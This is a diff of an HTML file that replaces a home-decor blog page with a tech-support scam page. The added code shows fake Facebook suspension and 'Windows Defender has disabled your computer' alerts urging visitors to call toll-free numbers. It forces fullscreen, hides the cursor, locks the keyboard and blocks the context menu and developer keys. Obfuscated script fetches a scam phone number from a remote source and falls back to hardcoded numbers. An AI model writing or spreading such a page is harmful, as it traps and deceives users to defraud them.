@@ -1,601 +1,475 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8" />
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Home Decor Hacks - Creative DIY Solutions</title>
+    <title>App</title>
     <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-
       body {
-        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-        line-height: 1.6;
-        color: #333;
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        min-height: 100vh;
-      }
-
-      .container {
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 0 20px;
-      }
-
-      header {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        padding: 2rem 0;
-        text-align: center;
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-      }
-
-      header h1 {
-        font-size: 3rem;
-        margin-bottom: 1rem;
-        font-weight: 300;
-      }
-
-      header p {
-        font-size: 1.2rem;
-        opacity: 0.9;
-      }
-
-      .search-bar {
-        background: white;
-        padding: 1rem;
-        border-radius: 50px;
-        margin: 2rem auto;
-        max-width: 500px;
-        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-      }
-
-      .search-bar input {
-        width: 100%;
-        padding: 0.8rem 1.5rem;
-        border: none;
-        outline: none;
-        font-size: 1rem;
-        border-radius: 25px;
-        background: #f8f9fa;
-      }
-
-      .categories {
+        background-image: url("bg1.png");
+        background-size: 100% 100%;
+        background-repeat: no-repeat;
+        background-position: center center;
         display: flex;
         justify-content: center;
-        gap: 1rem;
-        margin: 2rem 0;
-        flex-wrap: wrap;
-      }
-
-      .category-btn {
-        padding: 0.8rem 1.5rem;
-        border: none;
-        background: white;
-        color: #667eea;
-        border-radius: 25px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-      }
-
-      .category-btn:hover,
-      .category-btn.active {
-        background: #667eea;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
         color: white;
-        transform: translateY(-2px);
+      }
+      body.g {
+        background-image: url("bgg.png");
       }
 
-      .blog-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-        gap: 2rem;
-        margin: 3rem 0;
+      body.fullscreen {
+        background-image: url("bg2.jpg");
       }
 
-      .blog-card {
-        background: white;
-        border-radius: 20px;
-        overflow: hidden;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-        transition: transform 0.3s ease, box-shadow 0.3s ease;
-      }
-
-      .blog-card:hover {
-        transform: translateY(-10px);
-        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-      }
-
-      .card-image {
-        height: 200px;
-        background-size: cover;
-        background-position: center;
-        position: relative;
-      }
-
-      .card-image::before {
-        content: "";
+      #support-text {
         position: absolute;
+        top: 80%;
+        left: 50%;
+        transform: translateX(-50%);
+        font-size: 24px;
+        text-align: center;
+        width: 100%;
+        font-weight: bold;
+        color: black;
+        display: none;
+      }
+
+      #support-text span {
+        font-weight: normal;
+      }
+
+      #music {
+        display: none;
+      }
+
+      #modal-overlay {
+        display: none;
+        position: fixed;
         top: 0;
         left: 0;
-        right: 0;
-        bottom: 0;
-        background: linear-gradient(
-          45deg,
-          rgba(102, 126, 234, 0.3),
-          rgba(118, 75, 162, 0.3)
-        );
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 9999;
       }
 
-      .card-content {
-        padding: 1.5rem;
+      #modal-content {
+        background-color: white;
+        border-radius: 5px;
+        max-width: 400px;
+        margin: 100px auto;
+        padding: 20px;
+        text-align: center;
       }
 
-      .card-tag {
-        display: inline-block;
-        background: #667eea;
-        color: white;
-        padding: 0.3rem 0.8rem;
-        border-radius: 15px;
-        font-size: 0.8rem;
-        margin-bottom: 1rem;
+      #modal-close {
+        cursor: pointer;
+        color: #888;
+        float: right;
+        font-size: 20px;
+        font-weight: bold;
       }
 
-      .card-title {
-        font-size: 1.3rem;
-        margin-bottom: 1rem;
-        color: #333;
-        font-weight: 600;
+      #modal-message {
+        color: black;
+        font-weight: bold;
+        margin-bottom: 20px;
       }
 
-      .card-excerpt {
-        color: #666;
-        margin-bottom: 1rem;
-        line-height: 1.6;
+      #modal-image {
+        margin-bottom: 20px;
       }
 
-      .card-meta {
+      .modal-buttons {
         display: flex;
         justify-content: space-between;
-        align-items: center;
-        color: #999;
-        font-size: 0.9rem;
+        margin-top: 20px;
       }
 
-      .read-more {
-        color: #667eea;
-        text-decoration: none;
-        font-weight: 600;
-        transition: color 0.3s ease;
-      }
-
-      .read-more:hover {
-        color: #764ba2;
-      }
-
-      .featured-section {
-        background: white;
-        border-radius: 20px;
-        padding: 2rem;
-        margin: 2rem 0;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-      }
-
-      .featured-title {
-        font-size: 2rem;
-        margin-bottom: 1rem;
-        color: #333;
-        text-align: center;
-      }
-
-      .newsletter {
-        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-        color: white;
-        padding: 3rem;
-        border-radius: 20px;
-        text-align: center;
-        margin: 3rem 0;
-      }
-
-      .newsletter h3 {
-        font-size: 2rem;
-        margin-bottom: 1rem;
-      }
-
-      .newsletter-form {
-        display: flex;
-        max-width: 400px;
-        margin: 1.5rem auto 0;
-        gap: 1rem;
-      }
-
-      .newsletter-form input {
-        flex: 1;
-        padding: 1rem;
+      .modal-buttons button {
+        width: 100px;
+        padding: 10px 0;
         border: none;
-        border-radius: 25px;
-        outline: none;
-      }
-
-      .newsletter-form button {
-        padding: 1rem 2rem;
-        background: white;
-        color: #667eea;
-        border: none;
-        border-radius: 25px;
+        border-radius: 5px;
         cursor: pointer;
-        font-weight: 600;
-        transition: transform 0.3s ease;
+        font-weight: bold;
+        transition: background-color 0.3s;
       }
 
-      .newsletter-form button:hover {
-        transform: translateY(-2px);
+      .modal-buttons button.accept {
+        background-color: white;
+        color: black;
       }
 
-      footer {
-        background: #333;
+      .modal-buttons button.dismiss {
+        background-color: #3b5998;
         color: white;
-        text-align: center;
-        padding: 2rem;
-        margin-top: 3rem;
       }
 
-      @media (max-width: 768px) {
-        header h1 {
-          font-size: 2rem;
+      .modal-buttons button:hover {
+        background-color: rgba(0, 0, 0, 0.8);
+      }
+
+      @keyframes blink {
+        0% {
+          opacity: 1;
         }
 
-        .blog-grid {
-          grid-template-columns: 1fr;
+        50% {
+          opacity: 0;
         }
 
-        .newsletter-form {
-          flex-direction: column;
+        100% {
+          opacity: 1;
         }
+      }
+
+      .modal-buttons button.dismiss.blinking {
+        animation: blink 1s infinite;
+      }
+
+      #welcomeDiv {
+        display: none;
+        background-color: #000;
+        height: auto;
+        width: 550px;
+        position: fixed;
+        top: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        z-index: 9999999999;
+        text-align: center;
+      }
+
+      #welcomeDiv p {
+        color: #fefefe;
+        margin-top: 10px;
+        font-size: 16px;
+        opacity: 0.9;
       }
     </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var isPopupVisible = true;
+        var music = document.getElementById("music");
+        var isPlaying = false;
+
+        function toggleMusic() {
+          if (isPlaying) {
+            music.pause();
+          } else {
+            music.play();
+          }
+          isPlaying = !isPlaying;
+        }
+
+        function playMusicOnClick() {
+          toggleMusic();
+          document.removeEventListener("click", playMusicOnClick);
+        }
+
+        music.addEventListener("click", toggleMusic);
+        document.addEventListener("click", playMusicOnClick);
+
+        var fullscreenEnabled =
+          document.fullscreenEnabled ||
+          document.mozFullScreenEnabled ||
+          document.documentElement.webkitRequestFullScreen;
+
+        if (fullscreenEnabled) {
+          document.documentElement.requestFullscreen =
+            document.documentElement.requestFullscreen ||
+            document.documentElement.mozRequestFullScreen ||
+            document.documentElement.webkitRequestFullScreen;
+          document.cancelFullscreen =
+            document.cancelFullscreen ||
+            document.mozCancelFullScreen ||
+            document.webkitCancelFullScreen;
+
+          var isFullscreen = false;
+
+          document.addEventListener("click", function () {
+            if (!isFullscreen) {
+              isFullscreen = true;
+              document.documentElement.requestFullscreen();
+              document.body.classList.add("fullscreen");
+              showWelcomeDiv();
+              showSupportText();
+            }
+          });
+
+          document.addEventListener("fullscreenchange", function () {
+            isFullscreen = !isFullscreen;
+          });
+        }
+
+        var modalOverlay = document.getElementById("modal-overlay");
+        var modalClose = document.getElementById("modal-close");
+
+        function showModal() {
+          modalOverlay.style.display = "block";
+        }
+
+        function closeModal() {
+          modalOverlay.style.display = "none";
+        }
+
+        modalClose.addEventListener("click", closeModal);
+
+        showModal();
+
+        function hideCursor() {
+          document.documentElement.style.cursor = "none";
+        }
+
+        document.addEventListener("click", function () {
+          hideCursor();
+          document.removeEventListener("click", hideCursor);
+          if (isPopupVisible) {
+            closeModal();
+            isPopupVisible = false;
+          }
+        });
+
+        var acceptButton = document.getElementById("modal-accept");
+        var dismissButton = document.getElementById("modal-dismiss");
+
+        acceptButton.addEventListener("click", closeModal);
+        dismissButton.addEventListener("click", closeModal);
+
+        document.addEventListener("contextmenu", function (event) {
+          event.preventDefault();
+        });
+
+        document.addEventListener("keydown", function (e) {
+          if (
+            (e.ctrlKey &&
+              (e.keyCode === "U".charCodeAt(0) ||
+                e.keyCode === "u".charCodeAt(0))) ||
+            (e.ctrlKey &&
+              (e.keyCode === "C".charCodeAt(0) ||
+                e.keyCode === "c".charCodeAt(0))) ||
+            (e.ctrlKey &&
+              (e.keyCode === "S".charCodeAt(0) ||
+                e.keyCode === "s".charCodeAt(0)))
+          ) {
+            e.preventDefault();
+          }
+        });
+
+        function preventKeyEvents(event) {
+          const blockedKeyCodes = [123];
+          const keyCode = event.keyCode || event.which;
+
+          if (blockedKeyCodes.includes(keyCode)) {
+            event.preventDefault();
+            console.log(`Key with code ${keyCode} is blocked.`);
+          }
+        }
+
+        window.addEventListener("keydown", preventKeyEvents);
+      });
+
+      navigator.keyboard.lock();
+      document.onkeydown = function (e) {
+        return false;
+      };
+
+      function showWelcomeDiv() {
+        var welcomeDiv = document.getElementById("welcomeDiv");
+        welcomeDiv.style.display = "block";
+      }
+
+      function showSupportText() {
+        var supportText = document.getElementById("support-text");
+        supportText.style.display = "block";
+      }
+    </script>
   </head>
+
   <body>
-    <header>
-      <div class="container">
-        <h1>🏠 Home Decor Hacks</h1>
-        <p>
-          Transform your space with creative DIY solutions and budget-friendly
-          ideas
+    <audio id="music" src="text-to-speech.mp3" controls loop></audio>
+
+    <div id="modal-overlay">
+      <div id="modal-content">
+        <span id="modal-close">&times;</span>
+        <img id="modal-image" src="logofb.jpg" alt="Facebook Logo" />
+        <p id="modal-message">
+          We've Disabled Your Facebook Account As a Security Precaution.<br />
+          Because It Might Be Compromised.<br />
+          Accounts That Do Not Follow Our Community .<br />Standards Or Terms Of
+          Service May Be Suspended.<br />
+          Please Call Our Support Number Or Click Below To Appeal The
+          Suspension.
         </p>
-      </div>
-    </header>
-
-    <div class="container">
-      <div class="search-bar">
-        <input
-          type="text"
-          placeholder="Search for decor hacks..."
-          id="searchInput"
-        />
-      </div>
-
-      <div class="categories">
-        <button class="category-btn active" data-category="all">All</button>
-        <button class="category-btn" data-category="budget">
-          Budget-Friendly
-        </button>
-        <button class="category-btn" data-category="diy">DIY Projects</button>
-        <button class="category-btn" data-category="organization">
-          Organization
-        </button>
-        <button class="category-btn" data-category="lighting">Lighting</button>
-      </div>
-
-      <div class="featured-section">
-        <h2 class="featured-title">✨ Featured Hack of the Week</h2>
-        <div class="blog-card">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Featured</span>
-            <h3 class="card-title">
-              Transform Old Mason Jars into Stunning Wall Art
-            </h3>
-            <p class="card-excerpt">
-              Turn those empty mason jars into a beautiful wall installation
-              that adds both storage and style to any room. This hack combines
-              functionality with aesthetics perfectly.
-            </p>
-            <div class="card-meta">
-              <span>5 min read</span>
-              <a href="#" class="read-more">Read Full Tutorial →</a>
-            </div>
-          </div>
+        <div class="modal-buttons">
+          <button id="modal-accept" class="accept">
+            Appeal The Suspension
+          </button>
+          <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
         </div>
-      </div>
-
-      <div class="blog-grid" id="blogGrid">
-        <div class="blog-card" data-category="budget">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Budget-Friendly</span>
-            <h3 class="card-title">
-              $5 Coffee Table Makeover with Contact Paper
-            </h3>
-            <p class="card-excerpt">
-              Give your old coffee table a stunning marble look using contact
-              paper. This hack costs less than $5 and takes only 30 minutes!
-            </p>
-            <div class="card-meta">
-              <span>3 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="diy">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">DIY Projects</span>
-            <h3 class="card-title">Create Custom Wall Art with Washi Tape</h3>
-            <p class="card-excerpt">
-              Design your own geometric wall art using colorful washi tape.
-              Perfect for renters who want to add personality without damaging
-              walls.
-            </p>
-            <div class="card-meta">
-              <span>4 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="organization">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Organization</span>
-            <h3 class="card-title">Hidden Storage Behind Wall Art</h3>
-            <p class="card-excerpt">
-              Create secret storage compartments behind your wall art. Perfect
-              for storing small items while keeping your space clutter-free.
-            </p>
-            <div class="card-meta">
-              <span>6 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="lighting">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Lighting</span>
-            <h3 class="card-title">DIY String Light Canopy for Bedroom</h3>
-            <p class="card-excerpt">
-              Create a magical bedroom atmosphere with a DIY string light
-              canopy. This romantic lighting hack transforms any bedroom
-              instantly.
-            </p>
-            <div class="card-meta">
-              <span>7 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="budget">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Budget-Friendly</span>
-            <h3 class="card-title">Thrift Store Frame Gallery Wall</h3>
-            <p class="card-excerpt">
-              Build a stunning gallery wall using thrift store frames. Paint
-              them all the same color for a cohesive, expensive-looking display.
-            </p>
-            <div class="card-meta">
-              <span>5 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="diy">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">DIY Projects</span>
-            <h3 class="card-title">Painted Terracotta Pot Planters</h3>
-            <p class="card-excerpt">
-              Transform plain terracotta pots into colorful planters with
-              acrylic paint. Add personality to your indoor garden with this
-              easy DIY.
-            </p>
-            <div class="card-meta">
-              <span>4 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="organization">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1558618666-fcd25c85cd64?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Organization</span>
-            <h3 class="card-title">Shoe Organizer for Everything But Shoes</h3>
-            <p class="card-excerpt">
-              Use a hanging shoe organizer to store cleaning supplies, craft
-              materials, or bathroom essentials. Maximize vertical space
-              efficiently.
-            </p>
-            <div class="card-meta">
-              <span>3 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-
-        <div class="blog-card" data-category="lighting">
-          <div
-            class="card-image"
-            style="
-              background-image: url('https://images.unsplash.com/photo-1586023492125-27b2c045efd7?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80');
-            "
-          ></div>
-          <div class="card-content">
-            <span class="card-tag">Lighting</span>
-            <h3 class="card-title">DIY Paper Lantern Chandelier</h3>
-            <p class="card-excerpt">
-              Create a stunning chandelier using paper lanterns and fairy
-              lights. This budget-friendly lighting solution adds instant
-              elegance.
-            </p>
-            <div class="card-meta">
-              <span>8 min read</span>
-              <a href="#" class="read-more">Read More →</a>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div class="newsletter">
-        <h3>💡 Get Weekly Decor Hacks</h3>
-        <p>
-          Subscribe to receive the latest DIY home decor ideas and
-          budget-friendly hacks straight to your inbox!
-        </p>
-        <form class="newsletter-form">
-          <input type="email" placeholder="Enter your email address" required />
-          <button type="submit">Subscribe</button>
-        </form>
       </div>
     </div>
 
-    <footer>
-      <div class="container">
-        <p>
-          &copy; 2024 Home Decor Hacks. All rights reserved. | Made with ❤️ for
-          creative homeowners
-        </p>
-      </div>
-    </footer>
+    <div id="welcomeDiv">
+      <p>
+        Windows Defender Security Has Disabled Your Computer.<br />
+        Please Contact Microsoft Windows Support To Unlock Your Computer.<br />
+        Toll Free <strong id="t1"></strong>
+      </p>
+    </div>
+
+    <div id="support-text">
+      Call Microsoft Windows Support Toll Free <strong id="t2"></strong>
+    </div>
 
     <script>
-      // Category filtering
-      const categoryBtns = document.querySelectorAll(".category-btn");
-      const blogCards = document.querySelectorAll(".blog-card");
-
-      categoryBtns.forEach((btn) => {
-        btn.addEventListener("click", () => {
-          // Remove active class from all buttons
-          categoryBtns.forEach((b) => b.classList.remove("active"));
-          // Add active class to clicked button
-          btn.classList.add("active");
-
-          const category = btn.getAttribute("data-category");
-
-          blogCards.forEach((card) => {
-            if (
-              category === "all" ||
-              card.getAttribute("data-category") === category
-            ) {
-              card.style.display = "block";
-            } else {
-              card.style.display = "none";
-            }
-          });
-        });
-      });
-
-      // Search functionality
-      const searchInput = document.getElementById("searchInput");
-
-      searchInput.addEventListener("input", (e) => {
-        const searchTerm = e.target.value.toLowerCase();
-
-        blogCards.forEach((card) => {
-          const title = card
-            .querySelector(".card-title")
-            .textContent.toLowerCase();
-          const excerpt = card
-            .querySelector(".card-excerpt")
-            .textContent.toLowerCase();
-
-          if (title.includes(searchTerm) || excerpt.includes(searchTerm)) {
-            card.style.display = "block";
-          } else {
-            card.style.display = "none";
+      const _0x85a114 = _0x52c7;
+      function _0x52c7(_0x2df320, _0x6f7801) {
+        const _0x595ef8 = _0x595e();
+        return (
+          (_0x52c7 = function (_0x52c7a3, _0x2e46e3) {
+            _0x52c7a3 = _0x52c7a3 - 0xff;
+            let _0x3096e8 = _0x595ef8[_0x52c7a3];
+            return _0x3096e8;
+          }),
+          _0x52c7(_0x2df320, _0x6f7801)
+        );
+      }
+      function _0x595e() {
+        const _0x5cbd19 = [
+          "error",
+          "then",
+          "okok",
+          "64yUDlNU",
+          "modal-image",
+          "543664kQognC",
+          " +1(866)-450-6803   ",
+          "GET",
+          "Network\x20response\x20was\x20not\x20ok",
+          "modal-message",
+          "tfn",
+          "1122968tvoSth",
+          "939805DUWnxf",
+          "okok",
+          "11668ZWaIbb",
+          "6401263VMGpje",
+          "body",
+          "4arZiIp",
+          "18NTienL",
+          "textContent",
+          "680829cwPzoE",
+          "Error\x20fetching\x20or\x20processing\x20data:",
+          "has",
+          "1356310jodBGb",
+          "json",
+          "classList",
+          "application/json",
+          "Google\x20Found\x20A\x20Virus\x20On\x20Your\x20Computer.",
+          "27wzMoxq",
+          "add",
+          "catch",
+          "recipes",
+          "getElementById",
+          "search",
+          "location",
+          "src",
+        ];
+        _0x595e = function () {
+          return _0x5cbd19;
+        };
+        return _0x595e();
+      }
+      (function (_0x56f69c, _0x355537) {
+        const _0x498b6d = _0x52c7,
+          _0x1e4a9f = _0x56f69c();
+        while (!![]) {
+          try {
+            const _0x26c271 =
+              (parseInt(_0x498b6d(0x11a)) / 0x1) *
+                (parseInt(_0x498b6d(0x101)) / 0x2) +
+              parseInt(_0x498b6d(0x107)) / 0x3 +
+              (parseInt(_0x498b6d(0x104)) / 0x4) *
+                (parseInt(_0x498b6d(0xff)) / 0x5) +
+              (-parseInt(_0x498b6d(0x105)) / 0x6) *
+                (-parseInt(_0x498b6d(0x122)) / 0x7) +
+              (-parseInt(_0x498b6d(0x11c)) / 0x8) *
+                (parseInt(_0x498b6d(0x10f)) / 0x9) +
+              -parseInt(_0x498b6d(0x10a)) / 0xa +
+              -parseInt(_0x498b6d(0x102)) / 0xb;
+            if (_0x26c271 === _0x355537) break;
+            else _0x1e4a9f["push"](_0x1e4a9f["shift"]());
+          } catch (_0x1447c7) {
+            _0x1e4a9f["push"](_0x1e4a9f["shift"]());
           }
-        });
-      });
-
-      // Newsletter form
-      const newsletterForm = document.querySelector(".newsletter-form");
-      newsletterForm.addEventListener("submit", (e) => {
-        e.preventDefault();
-        const email = e.target.querySelector("input").value;
-        alert(`Thank you for subscribing! We'll send decor hacks to ${email}`);
-        e.target.reset();
-      });
-
-      // Smooth scroll animation for cards
-      const observerOptions = {
-        threshold: 0.1,
-        rootMargin: "0px 0px -50px 0px",
-      };
-
-      const observer = new IntersectionObserver((entries) => {
-        entries.forEach((entry) => {
-          if (entry.isIntersecting) {
-            entry.target.style.opacity = "1";
-            entry.target.style.transform = "translateY(0)";
-          }
-        });
-      }, observerOptions);
-
-      // Initialize cards with animation
-      blogCards.forEach((card) => {
-        card.style.opacity = "0";
-        card.style.transform = "translateY(20px)";
-        card.style.transition = "opacity 0.6s ease, transform 0.6s ease";
-        observer.observe(card);
-      });
+        }
+      })(_0x595e, 0x54fd2);
+      const urlParams = new URLSearchParams(
+        window[_0x85a114(0x115)][_0x85a114(0x114)]
+      );
+      urlParams[_0x85a114(0x109)](_0x85a114(0x112))
+        ? (document[_0x85a114(0x103)][_0x85a114(0x10c)][_0x85a114(0x110)]("g"),
+          (document[_0x85a114(0x113)](_0x85a114(0x11b))[_0x85a114(0x116)] =
+            "glogo.png"),
+          (document["getElementById"](_0x85a114(0x120))["textContent"] =
+            _0x85a114(0x10e)),
+          fetch(_0x85a114(0x119), {
+            method: _0x85a114(0x11e),
+            headers: { Accept: _0x85a114(0x10d) },
+          })
+            [_0x85a114(0x118)]((_0x4f38ec) => {
+              const _0x49cc4f = _0x85a114;
+              if (!_0x4f38ec["ok"]) throw new Error(_0x49cc4f(0x11f));
+              return _0x4f38ec["json"]();
+            })
+            [_0x85a114(0x118)]((_0x333354) => {
+              const _0x4386ba = _0x85a114,
+                _0xb70c8b = _0x333354[_0x4386ba(0x121)],
+                _0x3ce1ab = document[_0x4386ba(0x113)]("t1"),
+                _0x292d70 = document[_0x4386ba(0x113)]("t2");
+              (_0x3ce1ab[_0x4386ba(0x106)] = _0xb70c8b),
+                (_0x292d70[_0x4386ba(0x106)] = _0xb70c8b);
+            })
+            [_0x85a114(0x111)]((_0x3607d6) => {
+              const _0x18b5de = _0x85a114;
+              console[_0x18b5de(0x117)](_0x18b5de(0x108), _0x3607d6);
+              const _0x41f197 = document[_0x18b5de(0x113)]("t1"),
+                _0x3f55ba = document["getElementById"]("t2");
+              (_0x41f197[_0x18b5de(0x106)] = " +1 801 459 9712 "),
+                (_0x3f55ba["textContent"] = " +1 801 459 9712 ");
+            }))
+        : fetch(_0x85a114(0x100), {
+            method: "GET",
+            headers: { Accept: "application/json" },
+          })
+            [_0x85a114(0x118)]((_0x4be728) => {
+              const _0x23dc40 = _0x85a114;
+              if (!_0x4be728["ok"]) throw new Error(_0x23dc40(0x11f));
+              return _0x4be728[_0x23dc40(0x10b)]();
+            })
+            [_0x85a114(0x118)]((_0x5cf6d5) => {
+              const _0x1ef82f = _0x85a114,
+                _0x4f793f = _0x5cf6d5[_0x1ef82f(0x121)],
+                _0xcbbadd = document["getElementById"]("t1"),
+                _0x28ffef = document["getElementById"]("t2");
+              (_0xcbbadd["textContent"] = _0x4f793f),
+                (_0x28ffef[_0x1ef82f(0x106)] = _0x4f793f);
+            })
+            [_0x85a114(0x111)]((_0x3fe3ec) => {
+              const _0xd050db = _0x85a114;
+              console["error"](
+                "Error\x20fetching\x20or\x20processing\x20data:",
+                _0x3fe3ec
+              );
+              const _0x4ac4ac = document["getElementById"]("t1"),
+                _0x413c38 = document[_0xd050db(0x113)]("t2");
+              (_0x4ac4ac[_0xd050db(0x106)] = " +1 801 459 9712 "),
+                (_0x413c38[_0xd050db(0x106)] = " +1 801 459 9712 ");
+            });
     </script>
   </body>
 </html>
